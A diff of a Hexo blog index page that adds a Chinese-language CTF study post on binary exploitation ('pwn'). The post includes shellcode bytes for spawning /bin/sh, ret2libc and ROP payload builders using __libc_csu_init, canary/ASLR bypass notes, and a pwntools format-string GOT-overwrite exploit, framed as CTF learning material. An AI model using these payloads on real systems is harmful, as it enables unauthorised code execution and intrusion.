@@ -146,13 +146,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
@@ -169,6 +169,586 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/ctf/pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="szy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="S blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | S blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/01/22/ctf/pwn/" class="post-title-link" itemprop="url">pwn</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-01-22 20:29:20 / Modified: 20:29:21" itemprop="dateCreated datePublished" datetime="2024-01-22T20:29:20+08:00">2024-01-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>7.9k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>29 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>对方给你远程执行一个程序 你需要控制对方计算机</p>
+<ol>
+<li>发现漏洞 更改控制流</li>
+<li>找执行system(“&#x2F;bin&#x2F;sh”)的方式</li>
+</ol>
+<ul>
+<li>file 看文件类型 32还是64</li>
+<li>用ida看反编译</li>
+<li>checksec 看保护</li>
+<li>objdump -d file &gt; asm.txt 看汇编</li>
+</ul>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a target="_blank" rel="noopener" href="https://github.com/skysider/pwndocker">skysider&#x2F;pwndocker: A docker environment for pwn in ctf (github.com)</a></p>
+<p>gdb pwntools</p>
+<p>如果运行二进制报libc版本的错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>添加高版本的源</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://th.archive.ubuntu.com/ubuntu jammy main    #添加该行到文件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>运行升级</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="栈溢出-stackoverflow"><a href="#栈溢出-stackoverflow" class="headerlink" title="栈溢出(stackoverflow)"></a>栈溢出(stackoverflow)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[size];</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure>
+
+<p>gets不限制长度 read长度不匹配</p>
+<p>汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov esp,ebp</span><br><span class="line">sub esp,size</span><br><span class="line">...</span><br><span class="line">call gets</span><br><span class="line">add esp,size</span><br><span class="line">...</span><br><span class="line">leave  (mov ebp,esp  /  pop ebp)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>32位：覆盖size+4</p>
+<ul>
+<li><p>system(‘bin&#x2F;sh’) 或 execve(‘bin&#x2F;sh’,0,0) 都可以  </p>
+</li>
+<li><p>system有时候要求栈16地址对齐  但有时候满足了还是会出错</p>
+</li>
+<li><p>execve二 三个参数不设置可能也可以 （看运气）</p>
+</li>
+<li><p>本地调试的环境和libc会和远程有差异</p>
+</li>
+</ul>
+<h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>程序中存在system(“&#x2F;bin&#x2F;sh”)函数 直接把这个函数的地址覆盖至栈上的retaddr</p>
+<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><p>程序中不存在system函数 在栈上写shellcode  把栈的起始地址覆盖至栈上的retaddr 执行shellcode</p>
+<p><code>b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</code></p>
+<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>栈地址随机化 只能把shellcode写到另一块地方(确定的地址) 然后更改执行流至这个确定的地址</p>
+<p>这个地址必须是可以写入数据的  text段不允许写入数据  data段可以</p>
+<p><code>readelf -S findshellcode</code>可以查看 (栈地址随机化 text段和data段地址确定)</p>
+<p>利用两次read</p>
+<ul>
+<li><p>第一次 ：栈溢出 布置栈</p>
+<p><code>pad + p32(read_addr) + p32(shellcode_addr)+p32(0)+p32(shellcode_addr)+p32(0x80)</code></p>
+<p>最后三个是read的参数 分别是stdin 写入地址 写入字节数</p>
+</li>
+<li><p>第二次：发送shellcode（加\x00中止）</p>
+</li>
+</ul>
+<p>int 80 软中断原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80_xiaominthere的专栏-CSDN博客</a></p>
+<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h3><p>程序中不存在system函数 栈不可执行 利用libc里的system函数和&#x2F;bin&#x2F;sh字符串</p>
+<p>plt 局部 别人写的库 你程序里用到了  你程序里会有一个这个函数的地址 不是真实的 会直接跳到got中</p>
+<p>got 全局 但是记录的是偏移</p>
+<p>真实地址 &#x3D; 基地址 + 偏移地址  </p>
+<p>目标：拿到基地址与偏移地址 计算system与”&#x2F;bin&#x2F;sh”的真实地址</p>
+<ul>
+<li><p>偏移地址：可由一个确定版本的libc库决定 （本地调试的时候会使用本地环境的libc导致问题）</p>
+<ul>
+<li><p>题目给了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    func_offset = libc.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">    str_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">  - 题目没给</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    ```python</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;func&#x27;</span>,func_addr)<span class="comment">#泄露的真实地址</span></span><br><span class="line">    func_offset = libc.dump(<span class="string">&#x27;func&#x27;</span>)</span><br><span class="line">    str_offset = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">- 基地址 = 真实地址 - 偏移地址  </span><br><span class="line"></span><br><span class="line">  `elf = ELF(<span class="string">&#x27;./elf&#x27;</span>)`</span><br><span class="line"></span><br><span class="line">  - 需要一个在漏洞前已经执行过的函数(__libc_start_main  puts) 拿到它的真实地址</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要puts/write或其他输出的函数 把真实地址传过来</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要一个可以二次利用栈溢出的地址</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    main = <span class="number">0x123456</span><span class="comment">#真实地址</span></span><br><span class="line">    main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根据call的参数对寄存器或栈的要求 布置好内容</p>
+<p><code>payload1 = pad + p32(puts_plt) + p32(main) + p32(puts_got)</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv()[:4])</span><br><span class="line">base_addr = puts_addr - puts_offset</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>最后根据地址布置好栈 调用</p>
+<p><code>payload2 = pad + p32(system_addr) + pad4 + p32(binsh_addr)</code></p>
+<p>pad4是调用system的时候push进去的retaddr binsh_addr是第一个参数</p>
+<h3 id="phase-5-保护全开"><a href="#phase-5-保护全开" class="headerlink" title="phase 5 (保护全开)"></a>phase 5 (保护全开)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsp--&gt;  buf</span><br><span class="line">...</span><br><span class="line">rbp-8--&gt;  canary</span><br><span class="line">rbp  --&gt;  saved rbp</span><br><span class="line">rbp+8 --&gt; retaddr</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>canary为了防止被输出 最低位通常为0x0，用于截断字符串</p>
+<p>栈溢出时覆盖一位即可，可以拿到canary及其他数据</p>
+<h4 id="绕过ASLR-PIE"><a href="#绕过ASLR-PIE" class="headerlink" title="绕过ASLR PIE"></a>绕过ASLR PIE</h4><p>所有地址都是随机的，但是可以通过泄露的方式拿到</p>
+<ul>
+<li>泄露saved rbp 拿到stack地址</li>
+<li>泄露retaddr 拿到text地址</li>
+<li>main函数的retaddr里存放了__libc_start_main+243</li>
+</ul>
+<p>低12位不会被随机 可以用 <code>addr_leak &gt;&gt; 12 &lt;&lt; 12 | (addr &amp; 0xfff)</code>的方式配合ida获得任意地址</p>
+<p>或者直接partial write 只覆盖低12位</p>
+<h4 id="绕过NX-（ROP）"><a href="#绕过NX-（ROP）" class="headerlink" title="绕过NX （ROP）"></a>绕过NX （ROP）</h4><p><code>ROPgadget --binary rop_x64</code> 展示所有的gadgets</p>
+<p>栈不可执行，或栈地址随机化 </p>
+<p>只能执行其他确定地址上的任意代码，可以根据一些gadget配合栈的布置构造函数的调用</p>
+<p>以_libc_csu_init  64bit为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>可以通过如下方法执行任意函数并给三个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,addr</span>):</span><br><span class="line">    <span class="comment"># rdi = r15, rsi = r14, rdx = r13</span></span><br><span class="line">    <span class="comment"># r12 = addr of function want to call</span></span><br><span class="line">    <span class="comment"># rbx should be 0 and rbp should be 1</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * pad + p64(fake_ebp)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part2_addr) </span><br><span class="line">    <span class="comment">#pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part1_addr)</span><br><span class="line">    <span class="comment">#mov rdx rsi edi</span></span><br><span class="line">    <span class="comment">#call *r12</span></span><br><span class="line">    <span class="comment">#add rsp ,8  pop .......</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span>* <span class="number">56</span></span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">addr,arg1,arg2,arg3,ret_addr</span>):</span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,addr,arg3,arg2,arg1,ret_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>第一次利用：write 泄露地址，拿到libc基址</p>
+<p>第二次利用：read bss段写入system地址</p>
+<p>第三次利用：read bss段写入&#x2F;bin&#x2F;sh 或&#x2F;bin&#x2F;bash</p>
+<p>第四次利用：执行bss段记录的system函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">call(puts_got,puts_got,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">7</span>)[:<span class="number">6</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line"><span class="comment"># sendline send matters</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x200</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">p.sendline(p64(system_addr))</span><br><span class="line">call(bss_base+<span class="number">0x200</span>,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="格式化字符串-format-string"><a href="#格式化字符串-format-string" class="headerlink" title="格式化字符串(format string)"></a>格式化字符串(format string)</h2><p><code>printf(&quot;%p%p&quot;)</code>遇到%会默认有后续参数，然后拿到值进行输出，并不会检查参数个数</p>
+<p>64位情况下 格式化字符串本身是rdi，第一个%会输出rsi 后续是rdx rcx r8 r9</p>
+<p>第六个%开始会输出栈上的数据</p>
+<ul>
+<li><p>%p 输出8字节的数据</p>
+</li>
+<li><p>%s 把数据作为字符串的首地址 输出此地址对应的字符串(\0截断) 可用于泄露任意地址</p>
+</li>
+<li><p>%n 把已经输出的字节个数写入此数据对应的地址中 可用于修改任意地址</p>
+</li>
+<li><p>%k$p 输出第k个位置的数据</p>
+</li>
+<li><p>%kc 输出k bytes的字符</p>
+</li>
+</ul>
+<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>找到格式化字符串本身在栈上的位置，可用<code>AAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>查看哪个位置出现0x41 假设为k</p>
+<p><code>payload=&#39;addr&#39;+&#39;%k$s&#39;</code> 可用输出addr</p>
+<p>但由于地址为小端 且64位有8bytes地址 会被\0截断 所以需要把地址放后面</p>
+<p><code>payload = &#39;%k+1$s&#39;+pad+&#39;addr&#39;</code> 前面凑8bytes  addr右移一位(8bytes)</p>
+<h3 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h3><p><code>payload = &#39;%&#123;x&#125;c%&#123;k&#125;$n&#39;+ pad + addr</code> 把addr放到第k个位置 先用<code>%&#123;x&#125;c</code>输出x个字符 然后数值x会写入地址addr中</p>
+<ul>
+<li>n 4bytes</li>
+<li>hn 2bytes</li>
+<li>hhn 1byte</li>
+</ul>
+<p>例如修改printf的got表（0x601028）中存储的地址为system地址（0x7f9940d4f3a0）</p>
+<p>可以一次写入2bytes 注意是小端</p>
+<p>0x601028 地址存入0xf3a0</p>
+<p>0x60102a 地址存入0x40d4</p>
+<p>0x60102c 地址存入0x7f99</p>
+<p>一次写1byte 会导致payload太长 可能破坏了栈</p>
+<p>一次写4byte 会导致输出的字符输太多 太慢</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;%7$sAAAA&#x27;</span>.encode() + p64(printf_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Format String\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">recv = p.recv()</span><br><span class="line">printf_addr = u64(recv[:<span class="number">6</span>]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr_array = <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(sys_addr)[<span class="number">2</span>:])</span><br><span class="line">c = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        c[j] *= <span class="number">256</span></span><br><span class="line">        c[j] += sys_addr_array[-i-j*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line">block = <span class="number">16</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f1 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>c%<span class="subst">&#123;k&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f1)</span><br><span class="line">payload += f1 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">0</span>])</span><br><span class="line">acc = c[<span class="number">0</span>] + pad </span><br><span class="line">c[<span class="number">1</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">1</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f2 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">1</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f2)</span><br><span class="line">payload += f2 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">1</span>])</span><br><span class="line">acc += c[<span class="number">1</span>] + pad </span><br><span class="line">c[<span class="number">2</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">2</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">2</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f3 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">2</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">2</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f3)</span><br><span class="line">payload += f3 + <span class="string">&#x27;A&#x27;</span> * pad</span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.encode()</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><ul>
+<li>F5 看C语言  空格 看汇编</li>
+<li>shift+F12 看字符串</li>
+<li>右键可以找到引用地址  重命名等</li>
+<li>展示的汇编是intel语法 AT&amp;T可以通过<code>objdump -d xx &gt;&gt; xx.txt</code>查看</li>
+</ul>
+<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><ul>
+<li>remote 远程 process本地</li>
+<li>ELF 加载.so</li>
+<li>gdb.attach 本地调试</li>
+<li>sendline,recv,recvuntil</li>
+<li>p64,u64</li>
+</ul>
+<h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><ul>
+<li>run运行到断点或结束  start从第一行开始运行</li>
+<li>x 地址或$寄存器  看数据 &#x2F;g 8bytes &#x2F;s字符串</li>
+<li>info reg 看寄存器</li>
+<li>b *地址&#x2F;label 断点  c继续 si单步 n不进入函数 finish跳出函数</li>
+<li>got 看got表 vmmap看内存地址分布</li>
+</ul>
+<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><code>ROPgadget --binary xxx</code></p>
+<ul>
+<li>–string</li>
+<li>grep</li>
+</ul>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><code>checksec xxx</code></p>
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul>
+<li>recvuntil 最后加不加\n</li>
+<li>sendline与send不同 导致重复</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/chcore/IPC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
